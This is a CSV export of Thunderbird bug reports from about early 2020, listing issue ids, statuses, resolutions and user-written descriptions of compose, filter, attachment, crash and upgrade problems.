Issue id,Summary,Status,Priority,Resolution,Description
1609894,"Typing comma (,) in new recipient display name creates invalid pill prematurely (cannot enter: Surname, First Name <foo@bar.com>)",RESOLVED,P2,FIXED,"STR 1) New message, try to enter new recipient (unknown in AB): Doe, John <foo@bar.com> Actual - entering comma prematurely creates an invalid pill without address validation: (Doe) - impossible to enter display name with comma (even in double quotes) Expected - comma must only auto-create pill after validation (failing that, we'd have to wait for Enter before creating multiple pills in one go). We already have such validation algorithms because if you paste |Doe, John <foo@bar.com>, Jane@bar.com|, that's parsed correctly. - don't create pill prematurely for invalid recipient - allow entering display names with comma - also handle double quotes according to specifications (iirc, almost anything can be display name if in double quotes)"
1609895,Slightly longer recipient address pushes recipients area UI elements out of screen,RESOLVED,--,FIXED,"STR 1) New message, reduce width of TB application window to something like 16cm 2) Type |Dr. Michael Müller-Lüdenscheidt <michael@mueller-luedenscheidt.foo>| (sorry, you really have to type, as this bug does not seem to occur for copy and paste) Actual result - UI elements on the right side of the addressing area (e.g. recipient type buttons, Attach button, subject etc.) are pushed out of screen Expected - don't push UI elements out of screen Interestingly, as you keep trying, it even occurs when the actual text entered is way shorter than the available space in the recipient container. Something wrong here wrt auto-width."
1609901,Space in recipient's originalInput hard to remove with Backspace as it's falsy - polish trimming,RESOLVED,P1,FIXED,"STR 1) type |foo@bar.com, | (one trailing space - regular scenario if you intend to type |foo@bar.com, baz@bar.com|) 2) press backspace to remove the excess leading space Actual - bug 1609894: premature pill creation - space remains at the beginning of new input - backspace focuses pill (foo@bar.com) - hard to remove the space Expected - even after we fix bug 1609894: don't focus pill on backspace if there's spaces in input - investigate our options for trimming/preventing initial spaces, but space is a valid character of local part if quoted, and for other scenarios, we do auto-quote I think"
1609919,"Fails to Keep Folder Summary Files Up To Date - ""Unable to open the summary file""",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.3 Steps to reproduce: It occurs (mostly) when a message filter attempts to move a message from an inbox to a local folder. However, lately, it also has occurs on the first attempt to display other folders such as inboxes and sent folders. In the first case, the move fails. Actual results: In the above first case, the move fails and I get a message to that effect and the message remains in the inbox. In the second case, if I click on a folder where a Summary File requires creation, I can see the steps the program takes to build it and eventually, the contents of the folder appears. Expected results: I experienced this problem months ago, I reported it and then, just as suddenly as it appeared, it went away. Now, for the lase couple of iterations of T'Bird, it has once again, reared its ugly head!"
1609928,Pills created from an address retrieved via LDAP appear in orange,RESOLVED,P2,FIXED,Pills created from an address retrieved via LDAP appear in orange.
1609931,"Reverts Back to ""Threaded"" and Selects Most Items For Display",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.3 Steps to reproduce: Despite my requesting ""unthreaded"" and deselecting ""thread"", ""read"", and ""junk status"", T'Bird returns to ""threaded"", and selects ""threaded"", ""read"", and ""junk status"". Actual results: See above. This happens over and over. Expected results: Once selected or deselected, as appropriate, T'Bird should leave these settings alone."
1609958,Cursor not visible upon first edit of recipient pill,RESOLVED,P1,FIXED,"STR 1) New message, type |John Doe <john@asdf.com>| as recipient (sic; must be longer than edit-pill default length), press Enter -> creates new pill. 2) cursor left to select virgin pill, press Enter to edit Actual - cursor not visible (but functional, at the end of label; note that the bug does not occur if your recipient is too short) - starting from 2nd edit, cursor always visible Expected - cursor should be visible also on first edit of a pill Notes My display settings on Windows have 140% screen scaling, which may change font sizes."
1610023,Thunderbird erroneously displays incorrect additional email address in To list.,RESOLVED,P1,FIXED,"I just noticed a problem with the display of messages in Thunderbird 74.0a1 20200117095219 on Fedora 31 x86_64. It appeared I had sent a personal email and accidentally included dev-platform@lists.mozilla.org, fx-team@mozilla.com and qa-leads@mozilla.com in the To: list when I sent it. I was mortified but on closer investigation the message did not appear in the news groups or mailing lists and it was a red-herring. On closer inspection of my emails, I found every email showed these extra email addresses in the To: list even though the view source for the email did not show them. Quitting Thunderbird and restarting resolved the issue. I did see a lot of ""XUL box for mail-messageid element contained an inline #text child, forcing all its children to be wrapped in a block."" messages in the error console. I can't for certain blame it on today's build since it is possible I missed it since I don't normally read mail I've already sent. I don't have steps to reproduce but I'll comment here if I do."
1610154,"Active field is set to ""Reply to"" rather than ""To"" when changing identity",UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78 Steps to reproduce: Assumption: you have multiple identities available in Thunderbird configuration that you can select into the ""From"" drop-down list - Compose a new email using the ""Write"" button - Once the mail composer is open, switch the sender to a different identity than the default one into the ""From"" drop-down list Actual results: After selecting the new identity, the active field becomes ""Reply to"", which is misleading as you expect a ""To"" field to enter the recipient address Expected results: The active field should stay as ""To"" and not ""Reply to"" after selecting a new identity for the sender. This even creates a bigger problem when you reply to an email and switch identity as you can enter a recipient address without noticing that it is actually set into a ""Reply to"" field."
1610175,"mailing list ""XYZ does not match the pattern name@mail.com""",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Ich habe Maillisten für den Versand angelegt. Sie haben einfache Namen - zum Beispiel: XYZ. Der Versand funktioniert nicht mehr und ich erhalte den Hinweis: ""XYZ entspricht nicht dem Muster name@mail.com"" I have created mailing lists for shipping. They have simple names - for example: XYZ. The shipping no longer works and I receive the message: ""XYZ does not match the pattern name@mail.com"""
1610178,"When I automatically install 68.4.1 from 60.9.1 (64 bit) on MacOS, all the emails that I have opended are lost and all my folders also appear to be lost",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I automatically installed the upgrade that was downloaded. Note, I had a lot of open messages from Inbox before I started the upgrade, and I had not compressed the folder for quite some time (since compressing the folder loses all the message that I have open) Actual results: The install appears to work but does not finish as Thunderbird appears to contain no messages, and all of the Inbox messages that I had open when I started the upgrade have disappeared. Expected results: I would expect to be able to continue working as before with all the Inbox messages I am working on still being open."
1610180,[Attachments] The attachments bar is not scrollable even if there are too many attachments to fit,RESOLVED,P2,FIXED,"When there are many attachments in a received message, so they do not fit into the pane, the list overflows and is not completely visible, but the scrollbar does not appear, so the attachments cannot be accessed. STR: 1. Send or receive a message with many attachments. 1. View the message in the main Thunderbird window. 1. Potentially change the width of the window so the attachments are in a single column and do not fit into the pane. 1. The list of attachments overflows, but there is no scrollbar. --- For the record, this bug was reported to me by another user."
1610247,553 5.7.1 <xxx@gmail.com>: Sender address rejected: not owned by user,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: Automatic update performed last week Actual results: Error ""553 5.7.1 <xxx@gmail.com>: Sender address rejected: not owned by user xxx.volny.cz"" got after trying to send an e-mail from my second (gmail) account. SMPT is correctly set and paired with the account, but TB does not seem to notice/take into consideration any changes in configuration."
1610248,Sender of message with RFC 2047 encoded emojis (From: =?UTF-8?B?8J+HsPCfh60g8J+HqPCfh7Lwn4en8J+HriDwn4en8J+Hqw==?= <me@use.net>) not displayed correctly,RESOLVED,--,INVALID,"I received the attached message on a mailing list. It has From: =?UTF-8?B?8J+HsPCfh60g8J+HqPCfh7Lwn4en8J+HriDwn4en8J+Hqw==?= <me@use.net> which Thunderbird displays as From: 🇰🇭 🇨🇲🇧🇮 🇧🇫 Decoding 8J+HsPCfh60g8J+HqPCfh7Lwn4en8J+HriDwn4en8J+Hqw== at https://www.base64decode.org/ gives 🇰🇭 🇨🇲🇧🇮 🇧🇫, and decoding the entire RFC 2047 token at http://www.jorgk.com/decode/ also gives the same. However, my mobile phone app displays four flags (see screenshot) and I was told that Gmail also shows the flags. So who is right? Masatoshi-san, can you please take a look."
1610261,progressbar XUL/node/widget not available,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: On this page: https://developer.thunderbird.net/add-ons/tb68/changes it’s said that we should stop using the XUL element ""progressmeter"", and we should use “progress”. But it doesn’t work and is considered as a syntax error. Actual results: Syntax error. See attached file. Expected results: No syntax error."
1610305,"Creates second icon due to difference in capitalization used in WM_CLASS and StartupWMClass in ""thunderbird.desktop"" file",REOPENED,--,,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: Click on Thunderbird icon I created on Plank Actual results: Thunderbird opens with new icon to the far right Expected results: Thunderbird should use the existing icon"
1610312,Excessive time to load a many entry filter for editing.,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Where a filter has a large number of entries (~300), it takes a significant time (~20 seconds), to load the filter into the window for editing. After cancelling and returning to the Messages Filter page, it then takes a significant time (~20 seconds) to mouse click onto an alternative entry. Sometimes the dreaded spinning coloured ball appears. Eventually it appears to resolve itself and it is then possible to select any entries without delay, either with the mouse, or the up-down arrow keys. This problem appeared with one of the latest updates. However, searches show that it had been complained of in the past, in 2011, 2014, and 2017. The filters run normally on a message folder at high speed. It is only when trying to edit a filter that there is a problem. I resolved the problem back to a manageable situation by splitting the 300 items large entry into 20 entries of about 15 items in each. Each then loaded into the editing window in a reasonable time (less than 1 second). To effect this workaround, I edited msgFilterRules.dat as a text file and copied it back. It wou"
1610314,Thunderbird does not handle .ics files properly (but creates new message with .ics file attached),RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open an .ics file and select Thunderbird as the application to handle it. Actual results: Thunderbird creates a new message with the .ics file attached. Expected results: Thunderbird triggers the code behind Lightnings ""Events and Tasts > Import…"" menu and thus offers me to import the data in the .ics file - by adding it to an existing calendar OR - as a new calendar in lightning."
1610332,Thunderbird is not displaying plain text attachment inline to the email,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I take a plain text file .txt and can put hello world in the file for example. Then send an email to myself in plain text or html with the txt file being attached. Actual results: I receive the email it shows there is an attachment on it. I can open said email but I will no longer see the contents of the txt inline. I can download the attachment from bottom of email and then view the attachment if desired. Images display inline fine Expected results: The contents of the .txt file should of been in the message body at the bottom. We have .CSV files that we generate and email automatically that are also not displaying anymore on a separate machine. Images display inline fine
1610384,"in personal address book some column, like fullname (in italian Nome visualizzato) is no more available",UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Just updated to 73.0b1. When looking to my Personal Address Book only a few columns are available as headings of the list, the most important missing is Fullname, I'm not sure of the correct english translation. It's the third box in the contact form, where first and second are lastname and family name, Fullname contains both. But when looking to the details the Fullname is visible. Actual results: I've then tried to update last and family name on the detail form, then Thunderbird hangs."
1610406,Crash in [@ PLDHashTable::Search | mozilla::dom::DocumentOrShadowRoot::GetElementById],VERIFIED,--,FIXED,"#2 crash for 73.0b1 Regression in nightly. bp-2736a504-a4fc-4a77-876b-461d80200106 is the earliest buildid 20200105105422 73.0a1 Top 10 frames of crashing thread: 0 xul.dll PLDHashTable::Search xpcom/ds/PLDHashTable.cpp:501 1 xul.dll mozilla::dom::DocumentOrShadowRoot::GetElementById dom/base/DocumentOrShadowRoot.cpp:98 2 xul.dll nsMsgWindow::GetMessageWindowDocShell comm/mailnews/base/src/nsMsgWindow.cpp:76 3 xul.dll nsImapProtocol::SetupWithUrl comm/mailnews/imap/src/nsImapProtocol.cpp:825 4 xul.dll nsImapProtocol::LoadImapUrl comm/mailnews/imap/src/nsImapProtocol.cpp:2099 5 xul.dll nsImapIncomingServer::LoadNextQueuedUrl comm/mailnews/imap/src/nsImapIncomingServer.cpp:521 6 xul.dll nsresult `anonymous namespace'::SyncRunnable2<nsIImapMailFolderSink, const char*, nsIImapUrl*>::Run comm/mailnews/imap/src/nsSyncRunnableHelpers.cpp:121 7 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1241 8 xul.dll NS_ProcessNextEvent xpcom/threads/nsThreadUtils.cpp:486 9 xul.dll mozilla::ipc::MessagePump::Run ipc/glue/MessagePump.cpp:87 ```"
1610434,Redundant space at the right end of Tab bar (when Menu bar is enabled),RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.118 Safari/537.36 Actual results: Redundant space at the right end of Tab bar (when Menu bar is enabled) See the image. v60 is OK. (It's OK when mail.tabs.autoHide=True.)"
1610457,"""Junk"" status of a message is hidden from Add-Ons",RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.3 Steps to reproduce: I wrote an Add-On which searches for messages marked as ""junk"" by using ""browser.messages.list(...)"" to get a list of all messages in a folder and then the ""junk"" tag in the ""page.messages[n].tags[]"" array for a tag named ""junk"". Actual results: In Thunderbird 68.4.1, the ""page.messages[n].tags[]"" array is empty for ALL messages. This has the effect that ALL messages are detected as ""NOT marked as junk"" by the Add-On. Therefore the Add-On does not work correctly. Expected results: In an older Thunderbird 68.x version (I don't remember which version in the range 68.0-68.4.0), the ""page.messages[n].tags[]"" array contained a tag ""junk"" if the message was marked as ""junk"". This allowed the Add-On to detect messages that are marked as ""junk""."
1610460,"Thunderbird immediately segfaults (arch linux, self built) because of an outdated sqlite",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Updated my OS (Arch linux), then try to start. I've asked other people who has updated and they don't have this issue. So it is definently a me issue. But even if I move .thunderbird to .thunderbird_bak and start it doesn't work. thunderbird --safe-mode segfaults, reinstalling doesn't work, so I'm at a loss... hope you can help, I hate having to open citrix to get a windows environment with outlook 2007.... Actual results: $ thunderbird Segmentation fault (core dumped) Expected results: Thunderbird should open."
1610465,Total account and data loss,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Set up 3 mail accounts, 2 from Google and 1 SMTP each time after the first installation and all the subsequent crashes. Actual results: Thunderbird either crashed on its own or the macOS got an update and reopening thunderbird after either event has resulted in total data loss. All the account and their emails are gone and the ~/Library/Thunderbird/Profiles/ folder is completely emptied. Expected results: No data loss should have occured at any of the above mentioned events."
1610580,Mail preview shows garbled characters in preview on *first* click,RESOLVED,--,DUPLICATE,"When I click on a fresh unread mail, going 4into an unread folder, that's usually already relocated to another folder than Inbox, I can see some garbled characters (usually Ã) for diacritics (Umlauts like 'ö' but also some times whitespace characters). This can be fixed by clicking on a different email and then clicking on the mail in question again. I think that the wrong charset / encoding is used initially in that case."
1610661,Opening Attachment does not work if Thunderbird is executed as Remote App on Microsoft Remotedesktopserver,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Thunderbird is started from another Remote-App on Microsoft Remote Desktop Server (Windows Server 2016). All was working fine till update to 68.4.1. Opening an Attachment (as an example an xlsx-File from Excel) now cannot start directly the assigned application anymore (for example LibreOffice Calc). Actual results: Opening an xlsx-Attachment first starts dialog, what to do with it, suggests opening wirh LibreOffice Calc (as expected so far), but when I confirm the start another Dialog starts ""Dieser Link muss mit einer Anwendung gestartet werden"" (This link has to be opened with an application) and shows sent to file as only option first, alternatively I can open a search dialog from a button. The search I does not offer applications but I can navigate through file system to scalc.exe and start with it. Then there is an option to save this setting for all file-links, but I didn't check it. I fear this setting then saved for all attachments no matter what type this actually would be. The users working on the system reported, that nothing happened after confirming the ""Star"
1610673,Thunderbird stopped to receive emails after the last update,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Thunderbird/73.0 release 73.0b1 build 20200116202525 I am using Thunderbird for years, currently using 73.0b1, which was updated automatically yesterday evening. Since this update I stopped to receive emails. I am able to send emails from one my email address to another, and I am receiving them, but in other email client, not in Thunderbird. Not, it is not caused by deleting email after it is received by other client, I have set it properly to keep messages on the server. I have made no change in my settings, only what changed was just yesterday's automatical update - before it worked properly (for long years), after it it stopped to recieve emails. Actual results: Thunderbird is able to send new emails, but it is unable to receive them after the yesterday's update. However sent emails are received properly by other email clients. Expected results: Thunderbird should recieve emails as it was doing properly for yeras before the last update."
1610742,"'Remove Duplicates"" addon suddenly stopped working.",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: I am using thunderbird 73.0b1 (32-bit). With it I was using the addon 'Remove duplicates' for several months. Suddenly a couple days ago the addon stopped working. I tried removing and adding it again several times, even reinstalled mozilla thunderbird after removing the addons. But it is not working. Actual results: The addon gets installed. But in Tools - Addon Options, the options window does not open or opens partially and the options cannot be seen and selected. Expected results: Earlier a full window used to open showing all the options available for selection. After making the option selections the addon used to work very well."
1610746,Insert Charachters and Symbols,RESOLVED,--,FIXED,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Tried to insert symbol in new e-mail from the insert tab Actual results: Window with XML parsing error appeared Expected results: List of symbols to be selected
1610765,Cannot open already attached attachment in mail composer,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15 Steps to reproduce: create new email attach a file to be sent with email (.pdf or .jpeg) try to open it Actual results: no way to open it to check if file is the one I want to send Expected results: should open, used to do that 3 or 4 months ago"
1610771,Subject line is now white and the letters are white,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Entered text into the subject line. Actual results: The background is white and the letters are white. Expected results: The text should be colored black. Only way you can now see the subject line is if you place the cursor over the text. Why did you guys touch this at all?"
1610773,Some Tag colors not displayed in message list after upgrade from 60 to 68.4.1,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: Upgraded Thunderbird from 60 to 68.4.1 with existing tags applied to messages Actual results: Some tagged messages display in the message list pane using the system default colors, whereas others display using their tag color. This seems tag specific (i.e. all messages with a given tag display in the same way - either with color or without). The tag is correctly displayed (with the correct color) in the message preview pane and in the message reader. Removing and re-applying the tag does not fix the problem. Expected results: Tagged messages should display in the message list pane with their text in the tag color (or their background when selected). This is was the behaviour of all tags prior to the upgrade, and is the behaviour of some tags now."
1610795,App Not Responding when deleting e-mails after updating to 68.3.2 - not honoring Windows integrated search setting,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: After Thunderbird automatically updated to 68.3.1 I would continually get ""Not Responding"" after deleting e-mails. These are IMAP accounts but not sure if that matters. After some Internet searches I uncovered a person with the same issue and he said after he turned off ""Allow Windows Search to search messages"" it fixed his problem. That also fixed my problem but one thing I should note is that my checkbox was already unchecked so it wasn't honoring that setting after updating to 68.3.1. What I did was check the box, close Options and closed Thunderbird. Then I opened Thunderbird and went to Options and unchecked that setting. Then I restarted Thunderbird and all was working great again. Actual results: Even though the checkbox for ""Allow Windows Search to search messages"" was unchecked, Thunderbird was not honoring this setting. Expected results: Windows Search should have not been allowed to search my messages."
1610797,Crash in [@ nsLDAPSSLClose],RESOLVED,--,FIXED,crash is new with 68.3.0. Variety of crash addresses bp-41813288-f64c-4e5d-9b6b-ca7a50191205 68.3.0 0x0 bp-8b31771c-b470-4865-b0ce-073500200122 68.4.1 0xffffffffffffffff bp-0f3ae5b5-522c-48d8-8d01-589c00200122. 68.4.1 0xff1471ff ``` Top 10 frames of crashing thread: 0 xul.dll nsLDAPSSLClose comm/ldap/xpcom/src/nsLDAPSecurityGlue.cpp:70 1 ldap60.dll nsldapi_close_connection comm/ldap/c-sdk/libraries/libldap/os-ip.c:737 2 ldap60.dll nsldapi_free_connection comm/ldap/c-sdk/libraries/libldap/request.c:761 3 ldap60.dll nsldapi_free_request comm/ldap/c-sdk/libraries/libldap/request.c:953 4 ldap60.dll nsldapi_free_request comm/ldap/c-sdk/libraries/libldap/request.c:949 5 ldap60.dll nsldapi_result_nolock comm/ldap/c-sdk/libraries/libldap/result.c:134 6 ldap60.dll ldap_result comm/ldap/c-sdk/libraries/libldap/result.c:104 7 xul.dll nsLDAPConnectionRunnable::Run comm/ldap/xpcom/src/nsLDAPConnection.cpp:626 8 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1175 9 xul.dll NS_ProcessNextEvent xpcom/threads/nsThreadUtils.cpp:486 ```
1610798,Thunderbird ignores second command line argument for attachments,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: Enter a command line like this in a Linux terminal: thunderbird -compose to=""info@gmail.com"" ,subject=""SubjectText"" ,body=""bodytext"" ,attachment='/tmp/File.txt,/tmp/File2.txt' Actual results: Thunderbird opens but attaches only the first file. Expected results: Thunderbird should attach both files. This feature es mentioned here: https://stackoverflow.com/questions/27836576/adding-several-attachments-to-thunderbird-from-command-line"
1610800,Crash in [@ nsAbQueryLDAPMessageListener::InitFailed],RESOLVED,--,WORKSFORME,Not a new crash bp-2311a7fc-7a9b-41a7-90d3-b916f0200122. ``` Top 10 frames of crashing thread: 0 xul.dll nsAbQueryLDAPMessageListener::InitFailed comm/mailnews/addrbook/src/nsAbLDAPDirectoryQuery.cpp:228 1 xul.dll nsAbLDAPListenerBase::OnLDAPInit comm/mailnews/addrbook/src/nsAbLDAPListenerBase.cpp:223 2 xul.dll nsLDAPConnection::OnLookupComplete comm/ldap/xpcom/src/nsLDAPConnection.cpp:586 3 xul.dll mozilla::net::DNSListenerProxy::OnLookupCompleteRunnable::Run netwerk/dns/DNSListenerProxy.cpp:35 4 xul.dll nsThread::ProcessNextEvent xpcom/threads/nsThread.cpp:1175 5 xul.dll NS_ProcessNextEvent xpcom/threads/nsThreadUtils.cpp:486 6 xul.dll mozilla::ipc::MessagePump::Run ipc/glue/MessagePump.cpp:88 7 xul.dll MessageLoop::RunHandler ipc/chromium/src/base/message_loop.cc:308 8 xul.dll MessageLoop::Run ipc/chromium/src/base/message_loop.cc:290 9 xul.dll nsBaseAppShell::Run widget/nsBaseAppShell.cpp:137 ```
1610806,Message filter system does not follow filter sequence for messages that satisfy multipe rules,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Using Thunderbird 68.4.1 (64-bit) on linux mint 19 Receive a mail with subject ""[K] 123"" from fritz.mueller@mueller.de There are 2 filters defined, that move matches to dedicated mail folders: 1. Subject contains [ĸ] Move to Folder 1 2. From is fritz.mueller@mueller.de Move to folder 2 Old TB executed rule 1 in cases like this. Recent TB versions use rule 2. Actual results: TB does not execute the first rule *in the filter list*, that matches a mail. Expected results: Rule priorities are defined implicitly by position in the filter list. The first rule that matches a mail, should be executed. For me this looks like buggy code optimization…"
1610858,account settings failure,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: tried to whitelist an email address that got stuck in junk folder of webmail Actual results: I get a strange little pop up with no use or sense whenI try to enter in account settings. Same thing with trying to join chat... Expected results: Should have reached account settings like always with incoming server, outgoing stmp etc etc..."
1610874,'Use fixed width font for plain text messages' font type and size cannot be changed,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Recently upgraded from Thunderbird 60 to v68 (68.4.1), and found that the font used to display message bodies in my Sent mail folder is too small. I can use the Zoom function to make the text larger, but that doesn't stick between restarts. Options>Display>Formatting>Advanced -Uncheck the 'Use fixed width font for plain text messages' -Check the 'Use fixed width font for plain text messages' Actual results: -Uncheck the 'Use fixed width font for plain text messages' - this results in the message body using a proportional font that can be sized with the settings. -Check the 'Use fixed width font for plain text messages' results in the message body using a mono-spaced font whose type and size cannot be adjusted. Expected results: -Checking the 'Use fixed width font for plain text messages' should allow the user to control the type and size of the mono-spaced font (default: Consolus) from that Advanced options pane."
1611001,Thunderbitd CPU at 100% (v68.4.1 on archlinux),RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.14.0 Chrome/77.0.3865.129 Safari/537.36 Steps to reproduce: This happens every time I open TB. I come from this Wayne comment suggesting to open a bug here... Actual results: After some minutes I open TB it starts to eat my cpu and being really slow and unresponsive. I dont know what info do you need from me to debug this, but I'm willing give it a try if anyone can guide me. This is the first bug I write :) Thank you for the hard work, I love Thunderbird!"
1611017,V 73.0b1 Unable to login at server - peer using unsupported protocol,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Two days ago my thunderbird was updated from 72.0b3 to 73.0b1 (32bit). POP3 and SMTP settings: STARTTLS and Normal password Actual results: The new version is unable to download any new emails from the server even though they can be seen through a web interface: the status message 'connected to mail.tpg.com.au' is displayed for a few seconds and then disappears. Emails cannot be sent either: 'Sending message failed - peer using unsupported protocol'. I reinstalled the previous version and was obliged to create a new profile - all worked as expected - emails could be sent and received - but of course earlier emails and contact list were not accessible. Created a separate installation of 73.0b1 (64bit) and a new profile and the same problems occurred. The attachments show two steps in the creation of the new profile with automatic server configuration. The second shows there was a problem logging into the server using IMAP, but when the protocol was changed to POP3, it was accepted. Nevertheless the installation was unable to receive or send emails."
1611049,Attachments Opening with Incorrect Application v68.4.1 (32-bit),RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I may have a MS Word document attached to either an outgoing email or a sent email in my sent folder. I double-click the attachment. I did the same thing with an attached Excel file. Actual results: Thunderbird activates my PDF reader to open the MS Word or Excel document. Expected results: MS Word should have opened and that is what I have in the Tools=>Options=>Attachments assignment. Content Type: Microsoft Word Document Action: Use Microsoft Word (default) No listing for the Excel file type. Both of the associations are clearly made in the Windows 10 Pro default applications. Thunderbird does not understand default associations right now for some reason.
